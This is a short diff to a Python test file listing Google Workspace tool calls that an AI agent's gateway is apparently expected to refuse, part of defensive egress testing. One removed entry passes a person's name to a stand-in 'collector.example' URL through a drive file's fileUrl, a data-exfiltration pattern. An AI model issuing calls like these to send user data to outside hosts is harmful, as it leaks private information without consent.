@@ -1121,8 +1121,9 @@ _REFUSED_CALLS: list[tuple[str, dict[str, Any]]] = [
     ("google_workspace__x__send", {"text": _NOTE}),
     ("google_workspace__send_message", {"space_id": "spaces/AAA", "message_text": _NOTE}),
     ("google_workspace__modify_doc_text", {"document_id": "shared-doc", "text": _NOTE}),
-    ("google_workspace__create_drive_file",
-     {"file_name": "n.txt", "fileUrl": "https://collector.example/?q=Jordan"}),
+    # By content: the fileUrl form is refused by the gateway's own URL-fetch
+    # gate on every turn (test_mcp_gateway_fetch_and_script_egress.py).
+    ("google_workspace__create_drive_file", {"file_name": "n.txt", "content": _NOTE}),
     ("google_workspace__manage_event",
      {"action": "create", "calendar_id": "team@group.calendar.google.com", "summary": _NOTE}),
 ]
